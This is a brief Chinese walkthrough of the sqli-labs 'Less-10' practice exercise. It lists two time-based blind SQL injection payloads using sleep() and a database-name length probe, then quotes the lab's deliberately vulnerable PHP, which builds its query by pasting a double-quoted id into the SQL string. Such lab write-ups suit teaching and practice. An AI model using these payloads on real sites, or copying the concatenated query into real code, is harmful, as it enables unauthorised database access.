# Less-10

## 0x00 注入

?id=1" and sleep(5)--+ 有延时

?id=1" and if(length(database())=8, sleep(5), 1)--+ 有延时

## 0x01 分析

参数被双引号包围了

```php
$id = '"'.$id.'"';
$sql="SELECT * FROM users WHERE id=$id LIMIT 0,1";
$result=mysql_query($sql);
$row = mysql_fetch_array($result);

        if($row)
        {
        echo '<font size="5" color="#FFFF00">';
        echo 'You are in...........';
        echo "<br>";
        echo "</font>";
        }
        else
        {

        echo '<font size="5" color="#FFFF00">';
        echo 'You are in...........';
        //print_r(mysql_error());
        //echo "You have an error in your SQL syntax";
        echo "</br></font>";
        echo '<font color= "#0000ff" font size= 3>';

        }
}
```
